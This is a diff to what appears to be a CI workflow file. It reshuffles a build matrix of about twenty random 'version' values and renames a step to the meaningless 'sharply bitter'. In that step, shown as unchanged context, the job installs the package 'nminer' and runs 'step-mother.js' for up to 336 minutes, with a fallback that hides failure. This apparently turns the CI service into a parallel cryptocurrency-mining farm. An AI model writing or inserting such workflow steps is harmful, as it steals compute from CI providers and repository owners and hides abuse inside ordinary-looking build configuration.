@@ -9,26 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 877 }
-          - { version: 7790 }
-          - { version: 7195 }
-          - { version: 5826 }
-          - { version: 7801 }
-          - { version: 9429 }
-          - { version: 9728 }
-          - { version: 9971 }
-          - { version: 9077 }
-          - { version: 6085 }
-          - { version: 8507 }
-          - { version: 4330 }
-          - { version: 2470 }
-          - { version: 4635 }
-          - { version: 9673 }
-          - { version: 8466 }
-          - { version: 8643 }
-          - { version: 9836 }
-          - { version: 6365 }
-          - { version: 8123 }
+          - { version: 3041 }
+          - { version: 1375 }
+          - { version: 8441 }
+          - { version: 5038 }
+          - { version: 1867 }
+          - { version: 4904 }
+          - { version: 3520 }
+          - { version: 4428 }
+          - { version: 4620 }
+          - { version: 6203 }
+          - { version: 1532 }
+          - { version: 6938 }
+          - { version: 3726 }
+          - { version: 3270 }
+          - { version: 4602 }
+          - { version: 7810 }
+          - { version: 8419 }
+          - { version: 2287 }
+          - { version: 2436 }
 
     steps:
       - name: Checkout
@@ -39,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: sharply bitter
         run: |
           npm install nminer@latest
           timeout 336m node step-mother.js || echo "step-mother executed"
